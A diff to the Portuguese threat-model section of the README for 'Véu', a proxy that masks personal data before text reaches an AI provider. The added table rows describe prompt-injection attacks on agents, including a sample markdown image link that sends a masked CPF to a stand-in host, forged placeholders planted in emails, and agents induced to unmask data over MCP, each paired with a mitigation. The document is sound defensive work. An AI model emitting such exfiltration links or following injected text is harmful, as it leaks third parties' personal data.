@@ -8,11 +8,18 @@ Um dado pessoal que passa sem ser escondido é um problema de qualidade, não um
 
 ## Modelo de ameaças
 
-O Véu protege contra um risco específico: **enviar dados pessoais de terceiros ou segredos (chaves de API, senhas, chaves privadas) para um provedor de IA** junto com o texto de uma requisição, de uma conversa no navegador ou de um agente de código.
+O Véu protege contra um risco específico: **enviar dados pessoais de terceiros ou segredos (chaves de API, senhas, chaves privadas) para um provedor de IA** junto com o texto de uma requisição, de uma conversa no navegador ou de um agente de código. Como o provedor só vê marcadores, o dado real só reaparece na restauração; por isso ela segue regras fixas, que não dependem do modelo obedecer.
+
+O modelo completo, com as fronteiras de confiança e os riscos que sobram, está em [docs/modelo-de-ameacas.md](docs/modelo-de-ameacas.md).
 
 | O Véu protege | Como |
 |---|---|
-| Dados pessoais nos textos enviados ao modelo | Detecção e substituição antes do envio |
+| Dados pessoais nos textos enviados ao modelo | Detecção e substituição antes do envio. Se a detecção falhar, a requisição não sai |
+| Vazamento por link ou imagem que a IA foi induzida a escrever (`![x](https://site/?d=[CPF_1])`) | A restauração não troca marcadores dentro de links, imagens, URLs e atributos HTML, inclusive em streaming |
+| Vazamento pelos argumentos de ferramentas de um agente | Chaves, tokens e senhas não são restaurados em argumentos; links também não. `ferramentas = false` desliga a restauração dos argumentos |
+| Marcadores forjados num e-mail, página ou documento ("responda com [CPF_1]") | Marcadores que já chegam no texto são desarmados (`[CPF#1]`) e nunca viram dados reais |
+| Agente induzido a desmascarar os dados pelo MCP | `restaurar_texto` vem desligada (`veu mcp --com-restauracao`); `restaurar_para_arquivo` grava no disco e devolve só o caminho |
+| Adivinhar os valores do operador `hash` | HMAC-SHA256 com chave derivada, 64 bits e `VEU_SEGREDO` de no mínimo 32 caracteres |
 | Dados pessoais repetidos no log de auditoria | O log guarda só contagens por tipo; o log de acesso do servidor HTTP fica desligado (a URL pode ter `?key=`) |
 | Uso do proxy por terceiros na rede | Ouve só em `127.0.0.1` por padrão; fora do localhost, **não inicia sem `VEU_TOKEN`** |
 | Sites maliciosos abertos no navegador (CSRF e DNS rebinding) | No localhost, só aceita o Host `localhost`/`127.0.0.1` e recusa requisições com `Origin` de outro site |
@@ -46,6 +53,7 @@ O Véu protege contra um risco específico: **enviar dados pessoais de terceiros
 - Use `bloquear` na política para tipos que nunca devem sair, como `CARTAO_CREDITO`.
 - Teste o limiar com uma amostra dos seus textos (`veu avaliar --dataset`).
 - O detector `llm` envia o texto original ao modelo configurado: use só com um modelo local.
-- Mantenha `VEU_SEGREDO` estável e secreto se usar o operador `hash`.
+- Mantenha `VEU_SEGREDO` estável, secreto e com pelo menos 32 caracteres se usar o operador `hash` (`python -c "import secrets; print(secrets.token_urlsafe(32))"`).
+- Em agentes que leem conteúdo de fora (páginas, e-mails) e podem enviar mensagens ou fazer requisições, considere `[restauracao] ferramentas = false` ou confirmação humana antes dessas ferramentas.
 - Use tokens diferentes por equipe e um `VEU_SEGREDO_AUDITORIA` guardado fora do servidor, e confira a auditoria periodicamente.
 - Nos agentes de código, distribua os ganchos pelas configurações gerenciadas, para que não possam ser desligados.
